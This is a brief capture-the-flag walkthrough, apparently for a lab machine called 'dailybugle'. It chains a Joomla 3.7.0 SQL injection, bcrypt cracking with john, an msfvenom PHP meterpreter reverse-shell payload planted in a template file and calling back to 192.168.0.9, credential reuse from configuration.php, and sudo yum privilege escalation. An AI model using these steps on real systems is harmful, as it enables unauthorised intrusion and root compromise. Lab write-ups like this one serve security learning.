# Joomla 3.7.0 exploitation:
Use below script to exploit https://www.exploit-db.com/exploits/42033
https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py

Once we get the user hash, use john to crack the hash:
```sh
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=bcrypt
```

# Php Reverse Shell
Now login to /administrator and edit beez3 template index.php and add payload generated using below command.

```sh
msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R
```

After getting the reverse shell, Looking around for a bit we can see that there is a configuration.php file in the /var/www/html directory. After taking a look 
at the contents we see mysql db credentials. Which is same as login password.

Now if we run ```sudo -l```, we see below output:
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Which means the user can run yum with sudo and if we look for yum at gtfobins we found below:
https://gtfobins.github.io/gtfobins/yum/

WHich can be used to get privilege escalation.
